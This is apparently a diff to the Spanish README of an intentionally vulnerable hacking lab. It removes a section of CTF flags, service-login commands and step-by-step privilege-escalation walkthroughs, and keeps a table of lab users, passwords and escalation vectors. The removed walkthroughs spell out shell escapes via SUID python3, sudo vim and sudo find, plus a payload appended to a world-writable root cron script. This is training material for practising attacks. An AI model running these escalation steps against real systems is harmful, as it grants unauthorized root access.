@@ -918,153 +918,19 @@ Accede en: **http://localhost**
 | dave | P@ssw0rd | `161ebd7d45089b3446ee4e0d86dbcf92` | manager |
 
 ---
-
-## 🚩 Flags del laboratorio de Bruteforce
-
-El lab de Bruteforce expone servicios reales con flags CTF. Encuéntralas tras autenticarte:
-
-| Servicio | Cómo obtenerla | Flag |
-|----------|---------------|------|
-| **HTTP** | Login web exitoso con hydra/Burp | `HL{http_brut3f0rc3_w3b_l0gin_succ3ss}` |
-| **SSH** | `ssh admin@TARGET_IP` → `cat user.txt` | `HL{ssh_brut3f0rc3_l0gin_succ3ss}` |
-| **FTP** | `ftp admin@TARGET_IP` → `get ftp_flag.txt` | `HL{ftp_cr3d3nti4ls_r3us3d}` |
-| **SMB** | `smbclient //TARGET_IP/hacklabs -U admin` → `get flag.txt` | `HL{smb_sh4r3_3num3r4ti0n_succ3ss}` |
-| **SMB (admin_backup)** | `smbclient //TARGET_IP/admin_backup -U admin` → `get root.txt` | `HL{4dm1n_b4ckup_3xf1ltr4ti0n}` |
-| **SSH — root** | Escalada de privilegios desde cualquier usuario SSH | `HL{r00t_pr1v3sc_succ3ss}` |
-
-### Acceso a los servicios tras bruteforce
-
-```bash
-# SSH
-ssh admin@TARGET_IP          # password: password1
-cat user.txt
-
-# FTP
-ftp TARGET_IP                 # user: admin / password: password1
-get ftp_flag.txt
-
-# SMB — enumerar shares
-smbmap -H TARGET_IP -u admin -p 'password1'
-
-# SMB — leer flags
-smbclient //TARGET_IP/hacklabs -U admin%password1 -c 'get flag.txt /tmp/flag.txt'
-smbclient //TARGET_IP/admin_backup -U admin%password1 -c 'get root.txt /tmp/root.txt'
-cat /tmp/flag.txt
-cat /tmp/root.txt
-```
-
----
 ## 🔺 Escalada de Privilegios (SSH)
 
-Cada usuario SSH tiene un vector de escalada diferente. El objetivo final es leer `/root/root.txt` (`HL{r00t_pr1v3sc_succ3ss}`).
+Cada usuario SSH tiene un vector de escalada diferente. El objetivo final es leer `/root/root.txt`.
 
 > `admin` tiene `sudo` completo para que puedas inspeccionar la máquina (permisos SUID, sudoers, crons...) y validar los vectores del resto de usuarios.
 
-| Usuario | Contraseña | Vector | Técnica |
-|---------|-----------|--------|---------|
-| `admin` | `password1` | `sudo` sin restricciones | `sudo su` / `sudo bash` |
-| `alice` | `Password1` | **SUID en python3** | `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'` |
-| `bob` | `welcome1` | **sudo misconfiguration** → `vim` | `sudo vim -c ':!/bin/bash'` |
-| `charlie` | `changeme` | **Cron job world-writable** | Inyectar payload en `/opt/scripts/cleanup.sh` |
-| `dave` | `P@ssw0rd` | **sudo misconfiguration** → `find` | `sudo find . -exec /bin/bash \; -quit` |
-
-### 💣 Exploits paso a paso
-
-<details>
-<summary><strong>admin — sudo completo</strong></summary>
-
-```bash
-ssh admin@TARGET_IP   # password: password1
-sudo su               # → root
-cat /root/root.txt
-```
-
-> Usa `admin` para reconocimiento: `sudo cat /etc/sudoers.d/*`, `find / -perm -4000 2>/dev/null`, `cat /etc/cron.d/*`.
-
-</details>
-
-<details>
-<summary><strong>alice — SUID python3</strong></summary>
-
-```bash
-ssh alice@TARGET_IP   # password: Password1
-
-# Verificar SUID
-find / -perm -4000 -type f 2>/dev/null | grep python
-# → /usr/bin/python3
-
-# Escalar
-python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
-id    # uid=0(root)
-cat /root/root.txt
-```
-
-</details>
-
-<details>
-<summary><strong>bob — sudo vim</strong></summary>
-
-```bash
-ssh bob@TARGET_IP    # password: welcome1
-
-# Verificar sudo
-sudo -l
-# → (ALL) NOPASSWD: /usr/bin/vim
-
-# Escalar via GTFOBins
-sudo vim -c ':!/bin/bash'
-id    # uid=0(root)
-cat /root/root.txt
-```
-
-</details>
-
-<details>
-<summary><strong>charlie — Cron job world-writable</strong></summary>
-
-```bash
-ssh charlie@TARGET_IP   # password: changeme
-
-# Pista en el home
-cat note.txt
-# → Tip: check what runs automatically on this system...
-
-# Descubrir el cron
-cat /etc/cron.d/maintenance
-# → * * * * * root /opt/scripts/cleanup.sh
-
-# El script es escribible por todos
-ls -la /opt/scripts/cleanup.sh
-# → -rwxrwxrwx root root
-
-# Inyectar payload (copia bash con SUID)
-echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /opt/scripts/cleanup.sh
-
-# Esperar 1 minuto y escalar
-/tmp/rootbash -p
-id    # euid=0(root)
-cat /root/root.txt
-```
-
-</details>
-
-<details>
-<summary><strong>dave — sudo find</strong></summary>
-
-```bash
-ssh dave@TARGET_IP   # password: P@ssw0rd
-
-# Verificar sudo
-sudo -l
-# → (ALL) NOPASSWD: /usr/bin/find
-
-# Escalar via GTFOBins
-sudo find . -exec /bin/bash \; -quit
-id    # uid=0(root)
-cat /root/root.txt
-```
-
-</details>
+| Usuario | Contraseña | Vector |
+|---------|-----------|--------|
+| `admin` | `password1` | `sudo` sin restricciones |
+| `alice` | `Password1` | **SUID en python3** |
+| `bob` | `welcome1` | **sudo misconfiguration** → `vim` |
+| `charlie` | `changeme` | **Cron job world-writable** |
+| `dave` | `P@ssw0rd` | **sudo misconfiguration** → `find` |
 
 ---
 ## 🛠️ Herramientas compatibles
